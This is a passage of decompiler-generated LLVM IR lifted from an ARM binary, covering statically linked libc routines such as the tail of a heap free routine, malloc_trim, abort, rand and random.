  %v7_16944 = inttoptr i32 %v6_16944 to i32*
  store i32 %v0_16944, i32* %v7_16944, align 4
  br label %dec_label_pc_16ab0

dec_label_pc_1694c:                               ; preds = %dec_label_pc_168cc
  %v1_1694c = and i32 %v3_16910, 2
  %v2_1694c = icmp eq i32 %v1_1694c, 0
  br i1 %v2_1694c, label %dec_label_pc_16954, label %dec_label_pc_16a88

dec_label_pc_16954:                               ; preds = %dec_label_pc_1694c
  %v1_16954 = or i32 %v2_16914, 1
  store i32 %v1_16954, i32* %r3.global-to-local, align 4
  store i32 %v1_16954, i32* %v1_16914, align 4
  %v0_1695c = load i32, i32* @r6, align 4
  %v1_1695c = add i32 %v0_1695c, -4
  %v2_1695c = inttoptr i32 %v1_1695c to i32*
  %v3_1695c = load i32, i32* %v2_1695c, align 4
  store i32 %v3_1695c, i32* %r3.global-to-local, align 4
  %v0_16960 = load i32, i32* @r5, align 4
  %v1_16960 = load i32, i32* %ip.global-to-local, align 4
  %v2_16960 = add i32 %v1_16960, %v0_16960
  store i32 %v2_16960, i32* %lr.global-to-local, align 4
  %v1_16964 = urem i32 %v3_1695c, 2
  %v2_16964 = icmp eq i32 %v1_16964, 0
  %v1_16968 = add i32 %v2_16960, 4
  %v2_16968 = inttoptr i32 %v1_16968 to i32*
  %v3_16968 = load i32, i32* %v2_16968, align 4
  store i32 %v3_16968, i32* %r8.global-to-local, align 4
  br i1 %v2_16964, label %dec_label_pc_16970, label %dec_label_pc_169a4

dec_label_pc_16970:                               ; preds = %dec_label_pc_16954
  %v1_16970 = add i32 %v0_1695c, -8
  %v2_16970 = inttoptr i32 %v1_16970 to i32*
  %v3_16970 = load i32, i32* %v2_16970, align 4
  store i32 %v3_16970, i32* %r1.global-to-local, align 4
  %v2_16974 = sub i32 %v0_16960, %v3_16970
  store i32 %v2_16974, i32* %r3.global-to-local, align 4
  %v1_16978 = add i32 %v2_16974, 8
  %v2_16978 = inttoptr i32 %v1_16978 to i32*
  %v3_16978 = load i32, i32* %v2_16978, align 4
  store i32 %v3_16978, i32* %r2.global-to-local, align 4
  %v1_1697c = add i32 %v3_16978, 12
  %v2_1697c = inttoptr i32 %v1_1697c to i32*
  %v3_1697c = load i32, i32* %v2_1697c, align 4
  store i32 %v3_1697c, i32* %r4.global-to-local, align 4
  %v9_16980 = icmp eq i32 %v3_1697c, %v2_16974
  %v1_16984 = add i32 %v2_16974, 12
  %v2_16984 = inttoptr i32 %v1_16984 to i32*
  %v3_16984 = load i32, i32* %v2_16984, align 4
  store i32 %v3_16984, i32* %r0.global-to-local, align 4
  br i1 %v9_16980, label %dec_label_pc_1698c, label %dec_label_pc_169f0

dec_label_pc_1698c:                               ; preds = %dec_label_pc_16970
  %v1_1698c = add i32 %v3_16984, 8
  %v2_1698c = inttoptr i32 %v1_1698c to i32*
  %v3_1698c = load i32, i32* %v2_1698c, align 4
  store i32 %v3_1698c, i32* %r3.global-to-local, align 4
  %v9_16990 = icmp eq i32 %v3_1698c, %v2_16974
  br i1 %v9_16990, label %dec_label_pc_16998, label %dec_label_pc_169f0

dec_label_pc_16998:                               ; preds = %dec_label_pc_1698c
  store i32 %v3_16978, i32* %v2_1698c, align 4
  %v0_1699c = load i32, i32* %r0.global-to-local, align 4
  %v1_1699c = load i32, i32* %r2.global-to-local, align 4
  %v2_1699c = add i32 %v1_1699c, 12
  %v3_1699c = inttoptr i32 %v2_1699c to i32*
  store i32 %v0_1699c, i32* %v3_1699c, align 4
  %v0_169a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_169a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_169a0 = add i32 %v1_169a0, %v0_169a0
  store i32 %v2_169a0, i32* %ip.global-to-local, align 4
  %v0_169b0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_169b4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_169a4

dec_label_pc_169a4:                               ; preds = %dec_label_pc_16954, %dec_label_pc_16998
  %v0_16a30 = phi i32 [ %v1_16960, %dec_label_pc_16954 ], [ %v2_169a0, %dec_label_pc_16998 ]
  %v0_169b4 = phi i32 [ %v3_16968, %dec_label_pc_16954 ], [ %v0_169b4.pre, %dec_label_pc_16998 ]
  %v1_169c8 = phi i32 [ %v2_16960, %dec_label_pc_16954 ], [ %v0_169b0.pre, %dec_label_pc_16998 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_169a8 = load i32, i32* @r7, align 4
  %v2_169a8 = add i32 %v0_169a8, 32
  %v3_169a8 = inttoptr i32 %v2_169a8 to i32*
  %v4_169a8 = load i32, i32* %v3_169a8, align 4
  store i32 %v4_169a8, i32* %r2.global-to-local, align 4
  %v1_169ac = add i32 %v4_169a8, 44
  %v2_169ac = inttoptr i32 %v1_169ac to i32*
  %v3_169ac = load i32, i32* %v2_169ac, align 4
  store i32 %v3_169ac, i32* %r3.global-to-local, align 4
  %v9_169b0 = icmp eq i32 %v1_169c8, %v3_169ac
  %v1_169b4 = and i32 %v0_169b4, -4
  store i32 %v1_169b4, i32* %r0.global-to-local, align 4
  br i1 %v9_169b0, label %dec_label_pc_16a30, label %dec_label_pc_169bc

dec_label_pc_169bc:                               ; preds = %dec_label_pc_169a4
  %v2_169bc = add i32 %v1_169c8, %v1_169b4
  store i32 %v2_169bc, i32* %r3.global-to-local, align 4
  %v1_169c0 = add i32 %v2_169bc, 4
  %v2_169c0 = inttoptr i32 %v1_169c0 to i32*
  %v3_169c0 = load i32, i32* %v2_169c0, align 4
  store i32 %v3_169c0, i32* %r3.global-to-local, align 4
  %v1_169c4 = urem i32 %v3_169c0, 2
  %v2_169c4 = icmp eq i32 %v1_169c4, 0
  %v2_169c8 = add i32 %v1_169c8, 4
  %v3_169c8 = inttoptr i32 %v2_169c8 to i32*
  store i32 %v1_169b4, i32* %v3_169c8, align 4
  br i1 %v2_169c4, label %dec_label_pc_169d0, label %dec_label_pc_169bc.dec_label_pc_16a00_crit_edge

dec_label_pc_169bc.dec_label_pc_16a00_crit_edge:  ; preds = %dec_label_pc_169bc
  %v0_16a10.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16a00

dec_label_pc_169d0:                               ; preds = %dec_label_pc_169bc
  %v0_169d0 = load i32, i32* %lr.global-to-local, align 4
  %v1_169d0 = add i32 %v0_169d0, 8
  %v2_169d0 = inttoptr i32 %v1_169d0 to i32*
  %v3_169d0 = load i32, i32* %v2_169d0, align 4
  store i32 %v3_169d0, i32* %r1.global-to-local, align 4
  %v1_169d4 = add i32 %v3_169d0, 12
  %v2_169d4 = inttoptr i32 %v1_169d4 to i32*
  %v3_169d4 = load i32, i32* %v2_169d4, align 4
  store i32 %v3_169d4, i32* %r3.global-to-local, align 4
  %v9_169d8 = icmp eq i32 %v3_169d4, %v0_169d0
  %v1_169dc = add i32 %v0_169d0, 12
  %v2_169dc = inttoptr i32 %v1_169dc to i32*
  %v3_169dc = load i32, i32* %v2_169dc, align 4
  store i32 %v3_169dc, i32* %r2.global-to-local, align 4
  br i1 %v9_169d8, label %dec_label_pc_169e4, label %dec_label_pc_169f0

dec_label_pc_169e4:                               ; preds = %dec_label_pc_169d0
  %v1_169e4 = add i32 %v3_169dc, 8
  %v2_169e4 = inttoptr i32 %v1_169e4 to i32*
  %v3_169e4 = load i32, i32* %v2_169e4, align 4
  store i32 %v3_169e4, i32* %r3.global-to-local, align 4
  %v9_169e8 = icmp eq i32 %v3_169e4, %v0_169d0
  br i1 %v9_169e8, label %dec_label_pc_169f4, label %dec_label_pc_169f0

dec_label_pc_169f0:                               ; preds = %dec_label_pc_169d0, %dec_label_pc_1698c, %dec_label_pc_16970, %dec_label_pc_169e4
  %v0_169f0 = call i32 @abort()
  store i32 %v0_169f0, i32* %r0.global-to-local, align 4
  %v0_169f4.pre = load i32, i32* @r1, align 4
  %v1_169f4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_169f4

dec_label_pc_169f4:                               ; preds = %dec_label_pc_169e4, %dec_label_pc_169f0
  %v1_169f4 = phi i32 [ %v3_169dc, %dec_label_pc_169e4 ], [ %v1_169f4.pre, %dec_label_pc_169f0 ]
  %v0_169f4 = phi i32 [ %v3_169d0, %dec_label_pc_169e4 ], [ %v0_169f4.pre, %dec_label_pc_169f0 ]
  %v2_169f4 = add i32 %v1_169f4, 8
  %v3_169f4 = inttoptr i32 %v2_169f4 to i32*
  store i32 %v0_169f4, i32* %v3_169f4, align 4
  %v0_169f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_169f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_169f8 = add i32 %v1_169f8, 12
  %v3_169f8 = inttoptr i32 %v2_169f8 to i32*
  store i32 %v0_169f8, i32* %v3_169f8, align 4
  %v0_169fc = load i32, i32* %ip.global-to-local, align 4
  %v1_169fc = load i32, i32* %r0.global-to-local, align 4
  %v2_169fc = add i32 %v1_169fc, %v0_169fc
  store i32 %v2_169fc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16a00

dec_label_pc_16a00:                               ; preds = %dec_label_pc_169bc.dec_label_pc_16a00_crit_edge, %dec_label_pc_169f4
  %v0_16a10 = phi i32 [ %v0_16a10.pre, %dec_label_pc_169bc.dec_label_pc_16a00_crit_edge ], [ %v2_169fc, %dec_label_pc_169f4 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_16a04 = load i32, i32* @r7, align 4
  %v2_16a04 = add i32 %v0_16a04, 32
  %v3_16a04 = inttoptr i32 %v2_16a04 to i32*
  %v4_16a04 = load i32, i32* %v3_16a04, align 4
  %v1_16a08 = add i32 %v4_16a04, 52
  store i32 %v1_16a08, i32* %r3.global-to-local, align 4
  %v1_16a0c = add i32 %v4_16a04, 60
  %v2_16a0c = inttoptr i32 %v1_16a0c to i32*
  %v3_16a0c = load i32, i32* %v2_16a0c, align 4
  store i32 %v3_16a0c, i32* %r1.global-to-local, align 4
  %v1_16a10 = or i32 %v0_16a10, 1
  store i32 %v1_16a10, i32* %r2.global-to-local, align 4
  %v1_16a14 = load i32, i32* %r4.global-to-local, align 4
  %v2_16a14 = add i32 %v1_16a14, 12
  %v3_16a14 = inttoptr i32 %v2_16a14 to i32*
  store i32 %v1_16a08, i32* %v3_16a14, align 4
  %v0_16a18 = load i32, i32* %r1.global-to-local, align 4
  %v1_16a18 = load i32, i32* %r4.global-to-local, align 4
  %v2_16a18 = add i32 %v1_16a18, 8
  %v3_16a18 = inttoptr i32 %v2_16a18 to i32*
  store i32 %v0_16a18, i32* %v3_16a18, align 4
  %v0_16a1c = load i32, i32* %r2.global-to-local, align 4
  %v1_16a1c = load i32, i32* %r4.global-to-local, align 4
  %v2_16a1c = add i32 %v1_16a1c, 4
  %v3_16a1c = inttoptr i32 %v2_16a1c to i32*
  store i32 %v0_16a1c, i32* %v3_16a1c, align 4
  %v0_16a20 = load i32, i32* %ip.global-to-local, align 4
  %v1_16a20 = load i32, i32* %r4.global-to-local, align 4
  %v3_16a20 = add i32 %v1_16a20, %v0_16a20
  %v4_16a20 = inttoptr i32 %v3_16a20 to i32*
  store i32 %v0_16a20, i32* %v4_16a20, align 4
  %v0_16a24 = load i32, i32* %r4.global-to-local, align 4
  %v1_16a24 = load i32, i32* %r1.global-to-local, align 4
  %v2_16a24 = add i32 %v1_16a24, 12
  %v3_16a24 = inttoptr i32 %v2_16a24 to i32*
  store i32 %v0_16a24, i32* %v3_16a24, align 4
  %v0_16a28 = load i32, i32* %r4.global-to-local, align 4
  %v1_16a28 = load i32, i32* %r3.global-to-local, align 4
  %v2_16a28 = add i32 %v1_16a28, 8
  %v3_16a28 = inttoptr i32 %v2_16a28 to i32*
  store i32 %v0_16a28, i32* %v3_16a28, align 4
  br label %dec_label_pc_16a40

dec_label_pc_16a30:                               ; preds = %dec_label_pc_169a4
  %v2_16a30 = add i32 %v1_169b4, %v0_16a30
  store i32 %v2_16a30, i32* %ip.global-to-local, align 4
  %v1_16a34 = or i32 %v2_16a30, 1
  store i32 %v1_16a34, i32* %r3.global-to-local, align 4
  %v0_16a38 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16a38, i32* %v2_169ac, align 4
  %v0_16a3c = load i32, i32* %r3.global-to-local, align 4
  %v1_16a3c = load i32, i32* %r4.global-to-local, align 4
  %v2_16a3c = add i32 %v1_16a3c, 4
  %v3_16a3c = inttoptr i32 %v2_16a3c to i32*
  store i32 %v0_16a3c, i32* %v3_16a3c, align 4
  br label %dec_label_pc_16a40

dec_label_pc_16a40:                               ; preds = %dec_label_pc_16a00, %dec_label_pc_16a30
  %v0_16a40 = load i32, i32* %ip.global-to-local, align 4
  %v3_16a44 = icmp ult i32 %v0_16a40, 131070
  br i1 %v3_16a44, label %dec_label_pc_16ab0, label %dec_label_pc_16a48

dec_label_pc_16a48:                               ; preds = %dec_label_pc_16a40
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_16a4c = load i32, i32* @r7, align 4
  %v2_16a4c = add i32 %v0_16a4c, 32
  %v3_16a4c = inttoptr i32 %v2_16a4c to i32*
  %v4_16a4c = load i32, i32* %v3_16a4c, align 4
  store i32 %v4_16a4c, i32* @r4, align 4
  %v1_16a50 = inttoptr i32 %v4_16a4c to i32*
  %v2_16a50 = load i32, i32* %v1_16a50, align 4
  store i32 %v2_16a50, i32* %r3.global-to-local, align 4
  %v1_16a54 = and i32 %v2_16a50, 2
  %v2_16a54 = icmp eq i32 %v1_16a54, 0
  br i1 %v2_16a54, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_16a48
  store i32 %v4_16a4c, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_16a48, %bb
  %v1_16a5c = xor i1 %v2_16a54, true
  call void @__pseudo_cond_branch(i1 %v1_16a5c, i32 ptrtoint (i32* @global_var_16700.971 to i32))
  %v0_16a60 = load i32, i32* @r4, align 4
  %v1_16a60 = add i32 %v0_16a60, 44
  %v2_16a60 = inttoptr i32 %v1_16a60 to i32*
  %v3_16a60 = load i32, i32* %v2_16a60, align 4
  store i32 %v3_16a60, i32* %r3.global-to-local, align 4
  %v1_16a64 = add i32 %v3_16a60, 4
  %v2_16a64 = inttoptr i32 %v1_16a64 to i32*
  %v3_16a64 = load i32, i32* %v2_16a64, align 4
  store i32 %v3_16a64, i32* %r3.global-to-local, align 4
  %v1_16a68 = add i32 %v0_16a60, 836
  %v2_16a68 = inttoptr i32 %v1_16a68 to i32*
  %v3_16a68 = load i32, i32* %v2_16a68, align 4
  store i32 %v3_16a68, i32* %r2.global-to-local, align 4
  %v1_16a6c = and i32 %v3_16a64, -4
  store i32 %v1_16a6c, i32* %r3.global-to-local, align 4
  %v3_16a70 = icmp ult i32 %v1_16a6c, %v3_16a68
  br i1 %v3_16a70, label %dec_label_pc_16ab0, label %dec_label_pc_16a78

dec_label_pc_16a78:                               ; preds = %bb17
  store i32 %v0_16a60, i32* %r1.global-to-local, align 4
  %v1_16a7c = add i32 %v0_16a60, 840
  %v2_16a7c = inttoptr i32 %v1_16a7c to i32*
  %v3_16a7c = load i32, i32* %v2_16a7c, align 4
  store i32 %v3_16a7c, i32* %r0.global-to-local, align 4
  %v2_16a80 = call i32 @__malloc_trim(i32 %v3_16a7c, i32 %v0_16a60)
  store i32 %v2_16a80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16ab0

dec_label_pc_16a88:                               ; preds = %dec_label_pc_1694c
  %v2_16a88 = inttoptr i32 %v1_1691c to i32*
  %v3_16a88 = load i32, i32* %v2_16a88, align 4
  store i32 %v3_16a88, i32* %r0.global-to-local, align 4
  %v1_16a8c = add i32 %v4_1690c, 848
  %v2_16a8c = inttoptr i32 %v1_16a8c to i32*
  %v3_16a8c = load i32, i32* %v2_16a8c, align 4
  store i32 %v3_16a8c, i32* %r2.global-to-local, align 4
  %v1_16a90 = add i32 %v4_1690c, 868
  %v2_16a90 = inttoptr i32 %v1_16a90 to i32*
  %v3_16a90 = load i32, i32* %v2_16a90, align 4
  %v2_16a94 = add i32 %v3_16a88, %v1_16918
  store i32 %v2_16a94, i32* %r1.global-to-local, align 4
  %v1_16a98 = add i32 %v3_16a8c, -1
  store i32 %v1_16a98, i32* %r2.global-to-local, align 4
  %v2_16a9c = sub i32 %v3_16a90, %v2_16a94
  store i32 %v2_16a9c, i32* %r3.global-to-local, align 4
  store i32 %v2_16a9c, i32* %v2_16a90, align 4
  %v1_16aa4 = load i32, i32* @lr, align 4
  %v2_16aa4 = add i32 %v1_16aa4, 848
  %v3_16aa4 = inttoptr i32 %v2_16aa4 to i32*
  store i32 %v1_16a98, i32* %v3_16aa4, align 4
  %v0_16aa8 = load i32, i32* %r0.global-to-local, align 4
  %v1_16aa8 = load i32, i32* @r5, align 4
  %v2_16aa8 = sub i32 %v1_16aa8, %v0_16aa8
  store i32 %v2_16aa8, i32* %r0.global-to-local, align 4
  %v4_16aac = call i32 @munmap(i32 %v2_16aa8, i32 %v2_16a94, i32 %v1_16a98, i32 %v2_16a9c)
  store i32 %v4_16aac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16ab0

dec_label_pc_16ab0:                               ; preds = %bb17, %dec_label_pc_16a40, %dec_label_pc_16a78, %dec_label_pc_1692c, %dec_label_pc_16a88
  store i32 %v2_168c0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_16abc = load i32, i32* @r7, align 4
  %v2_16abc = add i32 %v0_16abc, 24
  %v3_16abc = inttoptr i32 %v2_16abc to i32*
  %v4_16abc = load i32, i32* %v3_16abc, align 4
  store i32 %v4_16abc, i32* @ip, align 4
  store i32 92872, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16abc)
  br label %dec_label_pc_16ac8

dec_label_pc_16ac8:                               ; preds = %entry, %dec_label_pc_16ab0
  store i32 %v3_168b4, i32* @r4, align 4
  store i32 %v6_168b4, i32* @r5, align 4
  store i32 %v9_168b4, i32* @r6, align 4
  store i32 %v12_168b4, i32* @r7, align 4
  store i32 %v18_168b4, i32* @lr, align 4
  ret i32 %v2_168c0

; uselistorder directives
  uselistorder i32 %v0_16a60, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_16a20, { 1, 0 }
  uselistorder i32 %v1_16960, { 1, 0 }
  uselistorder i32 %v0_16960, { 1, 0 }
  uselistorder i32 %v3_16934, { 1, 0 }
  uselistorder i32 %v1_16918, { 1, 0, 2 }
  uselistorder i32 %v2_16914, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1690c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_168bc, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_16ac8, { 1, 0 }
  uselistorder label %dec_label_pc_16ab0, { 4, 2, 0, 1, 3 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_16a40, { 1, 0 }
  uselistorder label %dec_label_pc_16a00, { 1, 0 }
  uselistorder label %dec_label_pc_169f4, { 1, 0 }
  uselistorder label %dec_label_pc_169f0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_169a4, { 1, 0 }
}

define i32 @function_16ad8(i32 %arg1) local_unnamed_addr {
dec_label_pc_16ad8:
  %v0_16ad8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16ad8, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16ad8
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16ad8, %bb
  %v10_16aec = phi i32 [ %arg1, %dec_label_pc_16ad8 ], [ 0, %bb ]
  ret i32 %v10_16aec

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_16af0 = load i32, i32* @r4, align 4
  store i32 %v3_16af0, i32* %stack_var_-12, align 4
  %v6_16af0 = load i32, i32* @r5, align 4
  %v4_16b00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_16b00, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_16b00, i32* @r0, align 4
  %v0_16b10 = call i32 @__malloc_consolidate()
  %v0_16b14 = load i32, i32* @r4, align 4
  %v0_16b18 = load i32, i32* @r5, align 4
  %v2_16b20 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16b20, i32* @r4, align 4
  store i32 %v6_16af0, i32* @r5, align 4
  %v2_16b24 = call i32 @__malloc_trim(i32 %v0_16b14, i32 %v0_16b18)
  %v0_16b28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16b28, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_16b2c = phi i32 [ %v2_16b24, %entry ], [ 0, %bb ]
  ret i32 %v4_16b2c

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r5, align 4
  %v4_16b48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 16) to i32*), align 4
  store i32 93012, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16b48)
  %v2_16b64 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v6_16b70 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_16b64, i32 0, i32 32)
  %v0_16b78 = load i32, i32* @r5, align 4
  %v2_16b78 = add i32 %v0_16b78, 26424
  %v3_16b78 = inttoptr i32 %v2_16b78 to i32*
  %v4_16b78 = load i32, i32* %v3_16b78, align 4
  %v2_16b7c = icmp eq i32 %v4_16b78, 0
  br i1 %v2_16b7c, label %dec_label_pc_16b84, label %dec_label_pc_16bc4

dec_label_pc_16b84:                               ; preds = %entry
  store i32 1, i32* %v3_16b78, align 4
  br label %dec_label_pc_16b8c

dec_label_pc_16b8c:                               ; preds = %dec_label_pc_16bd4, %dec_label_pc_16b84
  %v0_16b90 = load i32, i32* @r5, align 4
  %v2_16b90 = add i32 %v0_16b90, 1040
  store i32 %v2_16b90, i32* @r4, align 4
  %v2_16b9c = add i32 %v0_16b90, 36
  %v3_16b9c = inttoptr i32 %v2_16b9c to i32*
  %v4_16b9c = load i32, i32* %v3_16b9c, align 4
  call void @__pseudo_branch(i32 %v4_16b9c)
  %v1_16bac = call i32 @__GI_raise(i32 6)
  %v0_16bb8 = load i32, i32* @r5, align 4
  %v2_16bb8 = add i32 %v0_16bb8, 16
  %v3_16bb8 = inttoptr i32 %v2_16bb8 to i32*
  %v4_16bb8 = load i32, i32* %v3_16bb8, align 4
  store i32 93124, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16bb8)
  %v0_16bc8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16bc4

dec_label_pc_16bc4:                               ; preds = %entry, %dec_label_pc_16b8c
  %v1_16bdc = phi i32 [ %v0_16b78, %entry ], [ %v0_16bc8.pre, %dec_label_pc_16b8c ]
  %v2_16bc8 = add i32 %v1_16bdc, 26424
  %v3_16bc8 = inttoptr i32 %v2_16bc8 to i32*
  %v4_16bc8 = load i32, i32* %v3_16bc8, align 4
  %v7_16bcc = icmp eq i32 %v4_16bc8, 1
  br i1 %v7_16bcc, label %dec_label_pc_16bd4, label %dec_label_pc_16c10

dec_label_pc_16bd4:                               ; preds = %dec_label_pc_16bc4
  %v2_16bd4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_16bd4, i32* @r4, align 4
  store i32 2, i32* %v3_16bc8, align 4
  store i32 20, i32* @r2, align 4
  %v2_16bec = bitcast i32* %stack_var_-28 to i8*
  %v3_16bec = call i32 @__GI_memset(i8* %v2_16bec, i32 0)
  %v3_16c08 = call i32 @__libc_sigaction(i32 6, i32 %v2_16bd4, i32 0)
  br label %dec_label_pc_16b8c

dec_label_pc_16c10:                               ; preds = %dec_label_pc_16bc4
  %v7_16c10 = icmp eq i32 %v4_16bc8, 2
  br i1 %v7_16c10, label %dec_label_pc_16c18, label %dec_label_pc_16c24

dec_label_pc_16c18:                               ; preds = %dec_label_pc_16c10
  store i32 3, i32* %v3_16bc8, align 4
  %v0_16c20 = call i32 @abort()
  %v0_16c24.pre = load i32, i32* @r5, align 4
  %v1_16c24.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_16c24

dec_label_pc_16c24:                               ; preds = %dec_label_pc_16c10, %dec_label_pc_16c18
  %v3_16c30 = phi i32 [ 26424, %dec_label_pc_16c10 ], [ %v1_16c24.pre, %dec_label_pc_16c18 ]
  %v2_16c30 = phi i32 [ %v1_16bdc, %dec_label_pc_16c10 ], [ %v0_16c24.pre, %dec_label_pc_16c18 ]
  %v2_16c24 = add i32 %v2_16c30, %v3_16c30
  %v3_16c24 = inttoptr i32 %v2_16c24 to i32*
  %v4_16c24 = load i32, i32* %v3_16c24, align 4
  %v7_16c28 = icmp eq i32 %v4_16c24, 3
  br i1 %v7_16c28, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_16c24
  store i32 4, i32* %v3_16c24, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16c24, %bb
  call void @__pseudo_cond_branch(i1 %v7_16c28, i32 ptrtoint (i32* @global_var_12c30.980 to i32))
  br label %dec_label_pc_16c3c

dec_label_pc_16c3c:                               ; preds = %dec_label_pc_16c3c, %.thread3
  %v0_16c3c = call i32 @abort()
  br label %dec_label_pc_16c3c

; uselistorder directives
  uselistorder i32* %v3_16bc8, { 1, 0, 2 }
  uselistorder i32 ()* @abort, { 2, 1, 5, 4, 6, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_sigprocmask, { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_16c24, { 1, 0 }
  uselistorder label %dec_label_pc_16bc4, { 1, 0 }
}

define i32 @function_16c48(i32 %arg1) local_unnamed_addr {
dec_label_pc_16c48:
  %v0_16c48 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16c48, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_16c48
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16c48, %bb
  %v4_16c54 = phi i32 [ %arg1, %dec_label_pc_16c48 ], [ 0, %bb ]
  ret i32 %v4_16c54

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_16c60 = call i32 @random()
  ret i32 %v0_16c60
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_16c70 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r4, align 4
  %v4_16ca0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_16ca0)
  %v0_16cb4 = load i32, i32* @r4, align 4
  %v2_16cb4 = add i32 %v0_16cb4, 16
  %v3_16cb4 = inttoptr i32 %v2_16cb4 to i32*
  %v4_16cb4 = load i32, i32* %v3_16cb4, align 4
  store i32 ptrtoint (i32* @global_var_16cc0.986 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16cb4)
  %v2_16cc4 = ptrtoint i32* %stack_var_-20 to i32
  %v0_16cc8 = load i32, i32* @r4, align 4
  %v2_16cc8 = add i32 %v0_16cc8, 1216
  %v2_16ccc = inttoptr i32 %v2_16cc8 to i32*
  %v3_16ccc = call i32 @__GI_random_r(i32* %v2_16ccc, i32 %v2_16cc4)
  %v0_16cdc = load i32, i32* @r4, align 4
  %v2_16cdc = add i32 %v0_16cdc, 24
  %v3_16cdc = inttoptr i32 %v2_16cdc to i32*
  %v4_16cdc = load i32, i32* %v3_16cdc, align 4
  call void @__pseudo_branch(i32 %v4_16cdc)
  %v3_16ce8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_16c70, i32* @r4, align 4
  ret i32 %v3_16ce8
}

define i32 @function_16cfc(i32 %arg1) local_unnamed_addr {
dec_label_pc_16cfc:
  %v0_16cfc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16cfc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16cfc
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16cfc, %bb
